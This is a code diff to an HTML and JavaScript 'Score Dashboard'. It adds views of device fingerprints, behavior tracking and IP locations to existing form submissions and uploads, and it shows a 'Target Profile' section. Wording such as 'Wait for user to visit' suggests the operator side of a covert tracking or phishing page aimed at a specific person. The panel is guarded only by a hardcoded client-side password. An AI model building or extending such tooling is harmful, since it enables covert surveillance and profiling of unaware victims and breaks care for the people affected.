@@ -20,20 +20,23 @@
         .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
         .header h1{font-size:28px;font-weight:800}
         .header .sub{color:#888;font-size:13px}
-        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;margin-bottom:20px}
         .stat-box{background:#1a1a2e;padding:16px 20px;border-radius:10px;border:1px solid rgba(255,255,255,0.05);text-align:center}
-        .stat-box .num{font-size:28px;font-weight:800;color:#ffd700}
-        .stat-box .label{font-size:11px;color:#888}
+        .stat-box .num{font-size:24px;font-weight:800;color:#ffd700}
+        .stat-box .label{font-size:10px;color:#888}
         .card{background:#1a1a2e;border-radius:10px;border:1px solid rgba(255,255,255,0.05);margin-bottom:14px;overflow:hidden}
-        .card-header{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:600;font-size:14px;display:flex;justify-content:space-between;color:#fff}
-        .card-header .count{font-weight:400;color:#888;font-size:12px}
+        .card-header{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:600;font-size:13px;display:flex;justify-content:space-between;color:#fff}
+        .card-header .count{font-weight:400;color:#888;font-size:11px}
         .card-body{padding:12px 16px;max-height:400px;overflow-y:auto}
         .card-body pre{background:#0a0a0a;padding:12px;border-radius:6px;font-size:10px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;border:1px solid rgba(255,255,255,0.05);color:#aaa;margin:0}
-        .empty{color:#666;text-align:center;padding:20px;font-style:italic}
-        .badge{display:inline-block;padding:2px 12px;border-radius:50px;font-size:10px;font-weight:600}
+        .empty{color:#666;text-align:center;padding:20px;font-style:italic;font-size:13px}
+        .badge{display:inline-block;padding:2px 10px;border-radius:50px;font-size:9px;font-weight:600}
         .badge.form{background:#27ae60;color:#fff}
         .badge.upload{background:#2980b9;color:#fff}
-        .btn{display:inline-block;padding:4px 16px;background:#ffd700;color:#000;border-radius:50px;text-decoration:none;font-size:11px;font-weight:600;border:none;cursor:pointer}
+        .badge.fingerprint{background:#8e44ad;color:#fff}
+        .badge.behavior{background:#e67e22;color:#fff}
+        .badge.location{background:#2c3e50;color:#fff}
+        .btn{display:inline-block;padding:4px 14px;background:#ffd700;color:#000;border-radius:50px;text-decoration:none;font-size:10px;font-weight:600;border:none;cursor:pointer}
         .btn:hover{background:#f5a623}
         .btn-danger{background:#e74c3c;color:#fff}
         .btn-danger:hover{background:#c0392b}
@@ -46,12 +49,16 @@
         .modal-content{max-width:90%;max-height:90%;background:#1a1a2e;border-radius:12px;overflow:hidden;position:relative;border:1px solid rgba(255,255,255,0.1)}
         .modal-content .close{position:absolute;top:10px;right:15px;font-size:28px;color:#fff;cursor:pointer;background:rgba(0,0,0,0.6);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;z-index:10}
         .modal-content img{max-width:100%;max-height:80vh;display:block;margin:0 auto}
-        .refresh{display:inline-block;margin-left:10px;padding:2px 12px;background:rgba(255,255,255,0.05);border-radius:50px;font-size:11px;color:#888;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,0.05)}
+        .refresh{display:inline-block;margin-left:10px;padding:2px 12px;background:rgba(255,255,255,0.05);border-radius:50px;font-size:10px;color:#888;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,0.05)}
         .refresh:hover{background:rgba(255,255,255,0.1)}
         ::-webkit-scrollbar{width:4px}
         ::-webkit-scrollbar-track{background:#0a0a0a}
         ::-webkit-scrollbar-thumb{background:#ffd700;border-radius:10px}
         @media(max-width:600px){.stats{grid-template-columns:1fr 1fr}.gallery-grid{grid-template-columns:1fr 1fr}}
+        .data-tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px}
+        .data-tabs button{background:rgba(255,255,255,0.05);color:#aaa;border:1px solid rgba(255,255,255,0.05);padding:8px 16px;border-radius:8px;cursor:pointer;font-size:12px;transition:0.3s}
+        .data-tabs button:hover{background:rgba(255,255,255,0.08);color:#fff}
+        .data-tabs button.active{background:rgba(255,215,0,0.1);color:#ffd700;border-color:#ffd700}
     </style>
 </head>
 <body>
@@ -72,17 +79,28 @@
         <div>
             <h1>📊 Score Dashboard</h1>
             <span class="sub" id="entryCount">Loading...</span>
-            <span class="refresh" onclick="loadData()">↻ Refresh</span>
+            <span class="refresh" onclick="loadAllData()">↻ Refresh</span>
             <button class="btn" onclick="exportData()">📥 Export</button>
-            <button class="btn btn-danger" onclick="clearData()">🗑️ Clear</button>
         </div>
         <button class="btn btn-danger" onclick="logout()" style="background:#e74c3c;color:#fff;">🚪 Logout</button>
     </div>
     <div class="stats" id="stats">
-        <div class="stat-box"><div class="num" id="totalCount">0</div><div class="label">Total Entries</div></div>
-        <div class="stat-box"><div class="num" id="formCount">0</div><div class="label">Form Submissions</div></div>
+        <div class="stat-box"><div class="num" id="totalCount">0</div><div class="label">Total</div></div>
+        <div class="stat-box"><div class="num" id="formCount">0</div><div class="label">Forms</div></div>
+        <div class="stat-box"><div class="num" id="fingerprintCount">0</div><div class="label">Fingerprints</div></div>
+        <div class="stat-box"><div class="num" id="behaviorCount">0</div><div class="label">Behavior</div></div>
+        <div class="stat-box"><div class="num" id="locationCount">0</div><div class="label">Locations</div></div>
         <div class="stat-box"><div class="num" id="uploadCount">0</div><div class="label">Uploads</div></div>
     </div>
+    
+    <div class="data-tabs">
+        <button class="active" onclick="showTab('submissions')">📋 Submissions</button>
+        <button onclick="showTab('fingerprints')">🔍 Fingerprints</button>
+        <button onclick="showTab('behavior')">👆 Behavior</button>
+        <button onclick="showTab('locations')">📍 Locations</button>
+        <button onclick="showTab('uploads')">📁 Uploads</button>
+    </div>
+    
     <div id="dataContent"></div>
 </div>
 
@@ -96,21 +114,59 @@
 <script>
 const PASSWORD = '9990';
 const BACKEND_URL = window.location.origin;
+let allData = {};
+let currentTab = 'submissions';
 
-function loadData() {
-    fetch(BACKEND_URL + '/api/data')
+function loadAllData() {
+    fetch(BACKEND_URL + '/api/all')
     .then(response => response.json())
     .then(data => {
-        const submissions = data.filter(d => d.fullname);
-        const uploads = data.filter(d => d.file);
+        allData = data;
+        const submissions = data.submissions || [];
+        const fingerprints = data.fingerprints || [];
+        const behaviors = data.behaviors || [];
+        const locations = data.locations || [];
+        const uploads = submissions.filter(d => d.file);
         
-        document.getElementById('entryCount').textContent = data.length + ' entries';
-        document.getElementById('totalCount').textContent = data.length;
+        document.getElementById('entryCount').textContent = submissions.length + ' entries';
+        document.getElementById('totalCount').textContent = submissions.length + fingerprints.length + behaviors.length + locations.length;
         document.getElementById('formCount').textContent = submissions.length;
+        document.getElementById('fingerprintCount').textContent = fingerprints.length;
+        document.getElementById('behaviorCount').textContent = behaviors.length;
+        document.getElementById('locationCount').textContent = locations.length;
         document.getElementById('uploadCount').textContent = uploads.length;
         
-        let html = '';
-        
+        renderTab(currentTab);
+    })
+    .catch(error => {
+        console.error('Error loading data:', error);
+        document.getElementById('dataContent').innerHTML = '<div class="empty">Error loading data. Please refresh.</div>';
+    });
+}
+
+function renderTab(tab) {
+    currentTab = tab;
+    const data = allData;
+    const submissions = data.submissions || [];
+    const fingerprints = data.fingerprints || [];
+    const behaviors = data.behaviors || [];
+    const locations = data.locations || [];
+    const uploads = submissions.filter(d => d.file);
+    
+    let html = '';
+    
+    // Update tab buttons
+    document.querySelectorAll('.data-tabs button').forEach(btn => {
+        btn.classList.remove('active');
+        if (btn.textContent.includes(tab === 'submissions' ? 'Submissions' : 
+            tab === 'fingerprints' ? 'Fingerprints' :
+            tab === 'behavior' ? 'Behavior' :
+            tab === 'locations' ? 'Locations' : 'Uploads')) {
+            btn.classList.add('active');
+        }
+    });
+    
+    if (tab === 'submissions') {
         // Target Profile
         if (submissions.length > 0) {
             const latest = submissions[submissions.length - 1];
@@ -136,67 +192,66 @@ function loadData() {
             `;
         }
         
-        // Form Submissions
         html += `
             <div class="card">
                 <div class="card-header"><span>📋 Form Submissions</span><span class="count"><span class="badge form">${submissions.length}</span></span></div>
                 <div class="card-body">${submissions.length > 0 ? `<pre>${JSON.stringify(submissions, null, 2)}</pre>` : '<div class="empty">No submissions</div>'}</div>
             </div>
         `;
-        
-        // Uploads
+    } else if (tab === 'fingerprints') {
+        html += `
+            <div class="card">
+                <div class="card-header"><span>🔍 Device Fingerprints</span><span class="count"><span class="badge fingerprint">${fingerprints.length}</span></span></div>
+                <div class="card-body">${fingerprints.length > 0 ? `<pre>${JSON.stringify(fingerprints, null, 2)}</pre>` : '<div class="empty">No fingerprints yet. Wait for user to visit.</div>'}</div>
+            </div>
+        `;
+    } else if (tab === 'behavior') {
+        html += `
+            <div class="card">
+                <div class="card-header"><span>👆 Behavior Tracking</span><span class="count"><span class="badge behavior">${behaviors.length}</span></span></div>
+                <div class="card-body">${behaviors.length > 0 ? `<pre>${JSON.stringify(behaviors, null, 2)}</pre>` : '<div class="empty">No behavior data yet.</div>'}</div>
+            </div>
+        `;
+    } else if (tab === 'locations') {
+        html += `
+            <div class="card">
+                <div class="card-header"><span>📍 IP Locations</span><span class="count"><span class="badge location">${locations.length}</span></span></div>
+                <div class="card-body">${locations.length > 0 ? `<pre>${JSON.stringify(locations, null, 2)}</pre>` : '<div class="empty">No location data yet.</div>'}</div>
+            </div>
+        `;
+    } else if (tab === 'uploads') {
         html += `
             <div class="card">
                 <div class="card-header"><span>📁 Uploaded Files</span><span class="count"><span class="badge upload">${uploads.length}</span></span></div>
                 <div class="card-body">${uploads.length > 0 ? `<div class="gallery-grid">${uploads.map(u => `
-                    <div class="gallery-item" onclick="openImage('${u.file}')">
+                    <div class="gallery-item" onclick="openImage('/uploads/${u.file}')">
                         <img src="/uploads/${u.file}" alt="${u.file}" loading="lazy">
-                        <div class="info">${u.file} (Uploaded)</div>
+                        <div class="info">${u.file}</div>
                     </div>
                 `).join('')}</div>` : '<div class="empty">No uploads</div>'}</div>
             </div>
         `;
-        
-        // Raw Data
-        html += `
-            <div class="card">
-                <div class="card-header"><span>📄 Raw Data</span><span class="count">${data.length}</span></div>
-                <div class="card-body"><pre>${JSON.stringify(data, null, 2)}</pre></div>
-            </div>
-        `;
-        
-        document.getElementById('dataContent').innerHTML = html;
-    })
-    .catch(error => {
-        console.error('Error loading data:', error);
-        document.getElementById('dataContent').innerHTML = '<div class="empty">Error loading data. Please refresh.</div>';
-    });
+    }
+    
+    document.getElementById('dataContent').innerHTML = html;
+}
+
+function showTab(tab) {
+    renderTab(tab);
 }
 
 function exportData() {
-    fetch(BACKEND_URL + '/api/data')
-    .then(response => response.json())
-    .then(data => {
-        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'wrsf_data_' + new Date().toISOString().slice(0,10) + '.json';
-        a.click();
-        URL.revokeObjectURL(url);
-    });
+    const blob = new Blob([JSON.stringify(allData, null, 2)], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'wrsf_data_' + new Date().toISOString().slice(0,10) + '.json';
+    a.click();
+    URL.revokeObjectURL(url);
 }
 
-function clearData() {
-    if (confirm('⚠️ Delete ALL data? This cannot be undone!')) {
-        fetch(BACKEND_URL + '/api/data', { method: 'DELETE' })
-        .then(() => loadData())
-        .catch(error => console.error('Error clearing data:', error));
-    }
-}
-
-function openImage(filename) {
-    document.getElementById('modalImage').src = '/uploads/' + filename;
+function openImage(src) {
+    document.getElementById('modalImage').src = src;
     document.getElementById('imageModal').classList.add('active');
     document.body.style.overflow = 'hidden';
 }
@@ -219,7 +274,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         sessionStorage.setItem('score_auth', 'true');
         document.getElementById('loginScreen').style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
-        loadData();
+        loadAllData();
     } else {
         document.getElementById('loginError').style.display = 'block';
         setTimeout(() => { document.getElementById('loginError').style.display = 'none'; }, 3000);
@@ -233,12 +288,12 @@ document.addEventListener('keydown', function(e) {
 if (sessionStorage.getItem('score_auth') === 'true') {
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('dashboard').style.display = 'block';
-    loadData();
+    loadAllData();
 }
 
 setInterval(() => {
     if (sessionStorage.getItem('score_auth') === 'true') {
-        loadData();
+        loadAllData();
     }
 }, 30000);
 </script>
